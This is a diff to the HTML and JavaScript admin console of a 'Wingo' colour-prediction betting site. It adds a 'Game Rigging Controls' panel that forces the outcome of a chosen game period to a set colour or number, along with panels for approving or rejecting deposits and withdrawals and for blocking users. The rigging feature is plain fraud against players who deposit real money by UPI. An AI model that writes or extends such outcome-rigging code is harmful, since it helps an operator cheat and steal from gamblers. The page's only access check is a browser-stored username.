@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wingo - Admin Dashboard</title>
+    <title>OK.Win - Admin Console</title>
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- FontAwesome Icons -->
@@ -11,12 +11,12 @@
     <style>
         body {
             background-color: #f1f3f6;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             padding-top: 20px;
             padding-bottom: 80px;
         }
         .container {
-            max-width: 600px;
+            max-width: 650px;
         }
         .card {
             border-radius: 12px;
@@ -37,13 +37,29 @@
         .btn-approve {
             background-color: #28a745;
             color: white;
-            font-size: 0.85rem;
+            font-size: 0.82rem;
             font-weight: bold;
             border: none;
-            padding: 4px 12px;
+            padding: 4px 10px;
             border-radius: 5px;
         }
-        .btn-approve:hover { background-color: #218838; }
+        .btn-reject {
+            background-color: #dc3545;
+            color: white;
+            font-size: 0.82rem;
+            font-weight: bold;
+            border: none;
+            padding: 4px 10px;
+            border-radius: 5px;
+        }
+        .user-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #f1f3f6;
+        }
+        .user-row:last-child { border-bottom: none; }
         
         .bottom-nav {
             position: fixed;
@@ -51,7 +67,7 @@
             left: 50%;
             transform: translateX(-50%);
             width: 100%;
-            max-width: 600px;
+            max-width: 650px;
             height: 60px;
             background-color: #ffffff;
             box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
@@ -73,43 +89,53 @@
             border: none;
             background: transparent;
         }
-        .nav-item-btn.active { color: #fb4e4e; }
+        .nav-item-btn.active { color: #f24747; }
         .nav-item-btn i { font-size: 1.3rem; margin-bottom: 2px; }
-        
-        .user-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #f1f3f6;
-        }
-        .user-row:last-child { border-bottom: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h3 class="mb-4 text-center text-dark"><i class="fa-solid fa-user-shield me-2"></i>Wingo Admin Panel</h3>
+    <h3 class="mb-4 text-center text-dark fw-bold"><i class="fa-solid fa-user-shield me-2 text-danger"></i>Wingo Admin Control Panel</h3>
     
-    <!-- Settings section (UPI ID) -->
+    <!-- Outcome Rigging Controls -->
     <div class="card">
-        <div class="card-header">
-            <span><i class="fa-solid fa-gears me-2"></i>UPI / System Settings</span>
+        <div class="card-header bg-danger">
+            <span><i class="fa-solid fa-wand-magic-sparkles me-2"></i>Wingo Game Rigging Controls</span>
         </div>
         <div class="card-body">
             <div class="mb-3">
-                <label class="form-label font-weight-bold">Recharge UPI ID</label>
-                <input type="text" class="form-control" id="upiIdInput" placeholder="Enter target UPI ID">
+                <label class="form-label font-weight-bold">Target Period ID</label>
+                <input type="text" class="form-control" id="rigPeriodId" placeholder="e.g. 202608230005">
+                <small class="text-muted">Enter the next period ID to override its result.</small>
             </div>
-            <button class="btn btn-dark w-100" id="saveSettingsBtn">Save Settings</button>
+            <div class="mb-3">
+                <label class="form-label font-weight-bold">Force Result Outcome</label>
+                <select class="form-select" id="rigOutcome">
+                    <option value="red">Force Color: RED</option>
+                    <option value="green">Force Color: GREEN</option>
+                    <option value="violet">Force Color: VIOLET</option>
+                    <option value="0">Force Number: 0</option>
+                    <option value="1">Force Number: 1</option>
+                    <option value="2">Force Number: 2</option>
+                    <option value="3">Force Number: 3</option>
+                    <option value="4">Force Number: 4</option>
+                    <option value="5">Force Number: 5</option>
+                    <option value="6">Force Number: 6</option>
+                    <option value="7">Force Number: 7</option>
+                    <option value="8">Force Number: 8</option>
+                    <option value="9">Force Number: 9</option>
+                </select>
+            </div>
+            <button class="btn btn-danger w-100" onclick="saveRigSettings()">Force Next Result</button>
         </div>
     </div>
-    
-    <!-- Pending recharge requests -->
+
+    <!-- Recharge Deposits requests -->
     <div class="card">
-        <div class="card-header">
-            <span><i class="fa-solid fa-receipt me-2"></i>Pending Recharge Requests</span>
-            <span class="badge bg-danger" id="rechargeCount">0</span>
+        <div class="card-header bg-dark">
+            <span><i class="fa-solid fa-receipt me-2"></i>Pending Deposit Requests</span>
+            <span class="badge bg-success" id="rechargeCount">0</span>
         </div>
         <div class="card-body p-0">
             <div class="table-responsive">
@@ -123,18 +149,56 @@
                         </tr>
                     </thead>
                     <tbody id="pendingRechargesList">
+                        <tr><td colspan="4" class="text-muted py-3">No pending recharges.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdrawal cashouts requests -->
+    <div class="card">
+        <div class="card-header bg-dark">
+            <span><i class="fa-solid fa-hand-holding-dollar me-2"></i>Pending Withdrawal Requests</span>
+            <span class="badge bg-warning text-dark" id="withdrawCount">0</span>
+        </div>
+        <div class="card-body p-0">
+            <div class="table-responsive">
+                <table class="table table-hover align-middle mb-0 text-center">
+                    <thead>
                         <tr>
-                            <td colspan="4" class="text-muted py-3">No pending recharge requests.</td>
+                            <th>User</th>
+                            <th>Amount</th>
+                            <th>Method</th>
+                            <th>Details</th>
+                            <th>Action</th>
                         </tr>
+                    </thead>
+                    <tbody id="pendingWithdrawsList">
+                        <tr><td colspan="5" class="text-muted py-3">No pending withdrawals.</td></tr>
                     </tbody>
                 </table>
             </div>
         </div>
     </div>
     
-    <!-- Users list and wallet balances -->
+    <!-- UPI Details config -->
     <div class="card">
-        <div class="card-header">
+        <div class="card-header bg-dark">
+            <span><i class="fa-solid fa-gears me-2"></i>UPI / System Settings</span>
+        </div>
+        <div class="card-body">
+            <div class="mb-3">
+                <label class="form-label font-weight-bold">Recharge Deposit UPI ID</label>
+                <input type="text" class="form-control" id="upiIdInput" placeholder="Enter target UPI ID">
+            </div>
+            <button class="btn btn-dark w-100" onclick="saveSystemSettings()">Save System Settings</button>
+        </div>
+    </div>
+    
+    <!-- User wallets management -->
+    <div class="card">
+        <div class="card-header bg-dark">
             <span><i class="fa-solid fa-users me-2"></i>User Management</span>
         </div>
         <div class="card-body" id="usersList">
@@ -143,12 +207,11 @@
     </div>
 </div>
 
-<!-- Bottom Navigation Bar -->
+<!-- Shared Footer Nav -->
 <div class="bottom-nav">
-    <button class="nav-item-btn" onclick="window.location.href='game.html'"><i class="fa-solid fa-gamepad"></i>Game</button>
-    <button class="nav-item-btn" onclick="window.location.href='recharge.html'"><i class="fa-solid fa-wallet"></i>Wallet</button>
-    <button class="nav-item-btn active"><i class="fa-solid fa-user-gear"></i>Admin</button>
-    <button class="nav-item-btn" id="logoutBtn"><i class="fa-solid fa-right-from-bracket"></i>Logout</button>
+    <a href="index.html" class="nav-item-btn"><i class="fa-solid fa-house"></i>Home</a>
+    <a href="recharge.html" class="nav-item-btn"><i class="fa-solid fa-wallet"></i>Wallet</a>
+    <a href="account.html" class="nav-item-btn"><i class="fa-solid fa-user"></i>Account</a>
 </div>
 
 <!-- Firebase API Helper -->
@@ -156,10 +219,10 @@
 <script>
     const adminUser = localStorage.getItem('wingo_user');
     if (!adminUser) {
-        window.location.href = 'index.html';
+        window.location.href = 'login.html';
     }
 
-    // Load Settings (UPI ID)
+    // Load Settings
     async function loadSettings() {
         const settings = await firebaseRequest('settings');
         if (settings && settings.upi_id) {
@@ -167,27 +230,40 @@
         }
     }
 
-    // Save Settings (UPI ID)
-    document.getElementById('saveSettingsBtn').addEventListener('click', async () => {
+    async function saveSystemSettings() {
         const upi = document.getElementById('upiIdInput').value.trim();
         if (!upi) return;
-        
         const res = await firebaseRequest('settings', 'PUT', { upi_id: upi });
-        if (res) {
-            alert("Settings updated successfully!");
-        } else {
-            alert("Failed to update settings.");
-        }
-    });
+        if (res) alert("System Settings saved successfully!");
+        else alert("Failed to save settings.");
+    }
 
-    // Load and Render Pending Recharges
-    async function loadPendingRecharges() {
+    // Save Rig Result Outcomes
+    async function saveRigSettings() {
+        const period = document.getElementById('rigPeriodId').value.trim();
+        const outcome = document.getElementById('rigOutcome').value;
+        
+        if (!period) {
+            alert("Please enter a valid Period ID!");
+            return;
+        }
+        
+        const res = await firebaseRequest(`presets/${period}`, 'PUT', { value: outcome });
+        if (res) {
+            alert(`Rig preset successful! Period ${period} forced to land on: ${outcome.toUpperCase()}`);
+            document.getElementById('rigPeriodId').value = '';
+        } else {
+            alert("Rig preset failed.");
+        }
+    }
+
+    // Load Pending Recharge Deposits
+    async function loadPendingDeposits() {
         const recharges = await firebaseRequest('recharges');
         const tbody = document.getElementById('pendingRechargesList');
         tbody.innerHTML = '';
         
         let pendingCount = 0;
-        
         if (recharges) {
             Object.keys(recharges).forEach(utr => {
                 const req = recharges[utr];
@@ -200,51 +276,111 @@
                         <td class="font-monospace">${req.utr}</td>
                         <td>
                             <button class="btn-approve" onclick="approveRecharge('${req.utr}', '${req.username}', ${req.amount})">Approve</button>
+                            <button class="btn-reject" onclick="rejectRecharge('${req.utr}')">Reject</button>
                         </td>
                     `;
                     tbody.appendChild(tr);
                 }
             });
         }
-        
         document.getElementById('rechargeCount').innerText = pendingCount;
-        
         if (pendingCount === 0) {
-            tbody.innerHTML = `<tr><td colspan="4" class="text-muted py-3">No pending recharge requests.</td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="4" class="text-muted py-3">No pending deposits.</td></tr>`;
         }
     }
 
-    // Approve Recharge Request (Updates user balance and request status)
     async function approveRecharge(utr, user, amount) {
-        if (!confirm(`Are you sure you want to approve ₹${amount} for ${user}?`)) return;
+        if (!confirm(`Approve ₹${amount} recharge deposit for ${user}?`)) return;
         
-        // 1. Fetch current user balance
-        const userData = await firebaseRequest(`users/${user}`);
-        if (!userData) {
-            alert("Error: User profile not found!");
-            return;
-        }
+        const profile = await firebaseRequest(`users/${user}`);
+        if (!profile) return;
         
-        const currentBalance = userData.balance ?? 0;
-        const newBalance = currentBalance + amount;
+        const newBal = (profile.balance ?? 0) + amount;
+        const balRes = await firebaseRequest(`users/${user}/balance`, 'PUT', newBal);
         
-        // 2. Update balance in Firebase
-        const updateBalanceRes = await firebaseRequest(`users/${user}/balance`, 'PUT', newBalance);
-        
-        if (updateBalanceRes !== null) {
-            // 3. Mark recharge as successful
+        if (balRes !== null) {
             await firebaseRequest(`recharges/${utr}/status`, 'PUT', 'approved');
-            
-            alert(`Recharge approved successfully! ₹${amount} added to ${user}'s wallet.`);
-            loadPendingRecharges();
-            loadUsers();
-        } else {
-            alert("Failed to update user balance. Try again.");
+            alert(`Approved deposit! ₹${amount} added to ${user}'s wallet.`);
+            loadPendingDeposits();
+            loadUsersList();
         }
     }
 
-    // Load and Render Registered Users
-    async function loadUsers() {
+    async function rejectRecharge(utr) {
+        if (!confirm("Reject this deposit request?")) return;
+        await firebaseRequest(`recharges/${utr}/status`, 'PUT', 'rejected');
+        alert("Deposit rejected successfully.");
+        loadPendingDeposits();
+    }
+
+    // Load Pending Cash Withdrawals
+    async function loadPendingWithdraws() {
+        const withdraws = await firebaseRequest('withdrawals');
+        const tbody = document.getElementById('pendingWithdrawsList');
+        tbody.innerHTML = '';
+        
+        let pendingCount = 0;
+        if (withdraws) {
+            Object.keys(withdraws).forEach(wid => {
+                const req = withdraws[wid];
+                if (req.status === 'pending') {
+                    pendingCount++;
+                    
+                    let detailStr = '';
+                    if (req.method === 'upi') {
+                        detailStr = `UPI: ${req.details.upi}`;
+                    } else {
+                        detailStr = `A/C: ${req.details.acc}<br>Name: ${req.details.name}<br>IFSC: ${req.details.ifsc}`;
+                    }
+                    
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td><strong>${req.username}</strong></td>
+                        <td class="text-danger fw-bold">₹${req.amount}</td>
+                        <td class="text-uppercase font-monospace">${req.method}</td>
+                        <td style="font-size:0.75rem;">${detailStr}</td>
+                        <td>
+                            <button class="btn-approve" onclick="approveWithdraw('${req.id}')">Approve</button>
+                            <button class="btn-reject" onclick="rejectWithdraw('${req.id}', '${req.username}', ${req.amount})">Reject</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                }
+            });
+        }
+        document.getElementById('withdrawCount').innerText = pendingCount;
+        if (pendingCount === 0) {
+            tbody.innerHTML = `<tr><td colspan="5" class="text-muted py-3">No pending withdrawals.</td></tr>`;
+        }
+    }
+
+    async function approveWithdraw(id) {
+        if (!confirm("Approve withdrawal payout?")) return;
+        await firebaseRequest(`withdrawals/${id}/status`, 'PUT', 'approved');
+        alert("Withdrawal marked as approved!");
+        loadPendingWithdraws();
+    }
+
+    async function rejectWithdraw(id, user, amount) {
+        if (!confirm("Reject and refund cash to wallet?")) return;
+        
+        const profile = await firebaseRequest(`users/${user}`);
+        if (!profile) return;
+        
+        // Refund amount back to user balance
+        const newBal = (profile.balance ?? 0) + parseFloat(amount);
+        const balRes = await firebaseRequest(`users/${user}/balance`, 'PUT', newBal);
+        
+        if (balRes !== null) {
+            await firebaseRequest(`withdrawals/${id}/status`, 'PUT', 'rejected');
+            alert(`Withdrawal rejected. Refunded ₹${amount} back to ${user}'s wallet.`);
+            loadPendingWithdraws();
+            loadUsersList();
+        }
+    }
+
+    // Load registered users listing
+    async function loadUsersList() {
         const users = await firebaseRequest('users');
         const container = document.getElementById('usersList');
         container.innerHTML = '';
@@ -257,11 +393,12 @@
                 div.innerHTML = `
                     <div>
                         <strong>${u.username}</strong>
-                        <div class="small text-muted">Code: ${u.usercode ?? 'N/A'}</div>
+                        <div class="small text-muted">Invite: ${u.refcode ?? 'N/A'} • Status: ${u.status ?? 'active'}</div>
                     </div>
                     <div class="d-flex align-items-center gap-2">
                         <span class="badge bg-success font-monospace fs-6">₹${parseFloat(u.balance ?? 0).toFixed(2)}</span>
-                        <button class="btn btn-sm btn-outline-dark" onclick="editUserBalance('${u.username}', ${u.balance ?? 0})"><i class="fa-solid fa-edit"></i></button>
+                        <button class="btn btn-sm btn-outline-dark" onclick="editBalance('${u.username}', ${u.balance ?? 0})"><i class="fa-solid fa-edit"></i></button>
+                        <button class="btn btn-sm btn-outline-danger" onclick="toggleBlockUser('${u.username}', '${u.status ?? 'active'}')"><i class="fa-solid fa-user-lock"></i></button>
                     </div>
                 `;
                 container.appendChild(div);
@@ -271,36 +408,35 @@
         }
     }
 
-    // Manually edit a user's wallet balance
-    async function editUserBalance(user, currentBal) {
-        const newBal = prompt(`Enter new balance for ${user} (Current: ₹${currentBal}):`, currentBal);
-        if (newBal === null || newBal === '') return;
+    async function editBalance(user, currentBal) {
+        const amt = prompt(`Adjust wallet balance for ${user}:`, currentBal);
+        if (amt === null || amt === '') return;
         
-        const balValue = parseFloat(newBal);
-        if (isNaN(balValue)) {
-            alert("Please enter a valid number.");
-            return;
-        }
+        const parsed = parseFloat(amt);
+        if (isNaN(parsed)) return;
         
-        const res = await firebaseRequest(`users/${user}/balance`, 'PUT', balValue);
+        const res = await firebaseRequest(`users/${user}/balance`, 'PUT', parsed);
         if (res !== null) {
-            alert(`Wallet balance for ${user} updated to ₹${balValue.toFixed(2)}!`);
-            loadUsers();
-        } else {
-            alert("Failed to update wallet balance.");
+            alert("User balance updated!");
+            loadUsersList();
         }
     }
 
-    // Handle logout
-    document.getElementById('logoutBtn').addEventListener('click', () => {
-        localStorage.removeItem('wingo_user');
-        window.location.href = 'index.html';
-    });
+    async function toggleBlockUser(user, currentStatus) {
+        const targetStatus = currentStatus === 'blocked' ? 'active' : 'blocked';
+        if (!confirm(`Change ${user} status to ${targetStatus.toUpperCase()}?`)) return;
+        
+        const res = await firebaseRequest(`users/${user}/status`, 'PUT', targetStatus);
+        if (res) {
+            alert(`User status is now: ${targetStatus.toUpperCase()}`);
+            loadUsersList();
+        }
+    }
 
-    // Run on startup
     loadSettings();
-    loadPendingRecharges();
-    loadUsers();
+    loadPendingDeposits();
+    loadPendingWithdraws();
+    loadUsersList();
 </script>
 </body>
 </html>
